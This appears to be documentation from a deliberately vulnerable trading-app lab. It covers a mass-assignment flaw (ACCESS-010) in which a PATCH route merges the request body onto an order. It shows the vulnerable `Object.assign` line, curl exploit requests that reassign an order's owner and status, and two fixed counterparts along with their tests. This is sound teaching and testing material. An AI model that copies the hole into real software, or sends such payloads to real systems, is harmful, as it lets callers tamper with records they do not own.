A patch route takes "the fields that changed". Merging the body onto the entity writes every field the body carries, and an entity has fields the caller was never meant to set: here the order's `status` and the user it belongs to. Nothing names the properties this route may write, so the caller does.

The line (`apps/trading/src/orders/orders-patch.controller.ts`):

```ts
// ACCESS-010 / CWE-915: the body is merged into the entity as it arrived; status and userId are properties of it
Object.assign(order, body);
```

<a id="access-010-exploit"></a>
### ACCESS-010 — exploit lab

Run on 2026-11-28 against the whole lab, started by `pnpm start` on the port set 4600, 4601 to 4603, 4611, 4612, the store reset to the fake data before each request. `$URL` is trading's relay (`3202` on the defaults); `$A` is Alice's token. Order 1 is Alice's, `OPEN`.

```console
$ curl -s -X PATCH $URL/internal/orders/1 -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"memo":"patched by the scenario","status":"FILLED","userId":"u-bob"}'
{"order":{"id":"1","userId":"u-bob","symbol":"BTC-USD","side":"BUY","type":"LIMIT","limitPrice":"64000.00","quantity":"0.50000000","memo":"patched by the scenario","status":"FILLED","createdAt":"2026-01-01T00:00:00.000Z","user":{"id":"u-bob","orders":[]}}}
```

Read back through `orderDetails`:

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"query":"query($id: ID!) { orderDetails(id: $id) { id userId memo status } }","variables":{"id":"1"}}'
{"data":{"orderDetails":{"id":"1","userId":"u-bob","memo":"patched by the scenario","status":"FILLED"}}}
```

Alice's `OPEN` order became Bob's `FILLED` order: two writes the route never offered, from one body.

<a id="access-010-safe"></a>
### ACCESS-010 — vulnerable and protected

| | Operation | What it does with the same body |
| --- | --- | --- |
| Vulnerable | `PATCH /internal/orders/:id` | Merges it onto the entity: `memo`, `status` and `userId` are all written |
| Counterpart 1 | `updateOrder(input: UpdateOrderInput!)` | `UpdateOrderInput` declares `memo` alone, so the schema itself refuses the payload: `BAD_USER_INPUT`, `Variable "$input" got invalid value … Field "status" is not defined by type "UpdateOrderInput"` |
| Counterpart 2 | `PUT /internal/orders/:id` | Reads the memo by name and nothing else of the body: the identical body answers `200`, and only the memo is written |

The same body to the PUT, after a reset:

```console
$ curl -s -X PUT $URL/internal/orders/1 -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"memo":"patched by the scenario","status":"FILLED","userId":"u-bob"}'
{"order":{"id":"1","userId":"u-alice","symbol":"BTC-USD","side":"BUY","type":"LIMIT","limitPrice":"64000.00","quantity":"0.50000000","memo":"patched by the scenario","status":"OPEN","createdAt":"2026-01-01T00:00:00.000Z","user":{"id":"u-alice","orders":[]}}}
```

And the same read-back answers `{"data":{"orderDetails":{"id":"1","userId":"u-alice","memo":"patched by the scenario","status":"OPEN"}}}`: `OPEN` and `u-alice` stay.

**Scoped claim.** Each counterpart defeats this flaw for identical input: the `status` and `userId` that are written from the body through the PATCH are refused by name by the schema of `updateOrder`, and are not read by the PUT, which takes the memo alone. The claim is not that a typed input or a read by name makes every write safe; only that these two properties are not written through them.

<a id="access-010-tests"></a>
### ACCESS-010 — tests

`apps/trading/test/scenarios/access.int-spec.ts`, describe `ACCESS-010 — PATCH /internal/orders/:id: mass assignment`. One body, sent to the vulnerable route and to each protected counterpart:

- **The exploit:** the payload stores a status and a user the caller never owned.
- **Counterpart 1:** the input counterpart refuses it: `UpdateOrderInput` has memo alone.
- **Counterpart 2:** the PUT counterpart writes the memo alone: `OPEN` and `u-alice` stay.

The collection `postman/trading/vuln-nestjs.trading.postman_collection.json` carries the request `ACCESS-010 PATCH writes status and userId from the body`.
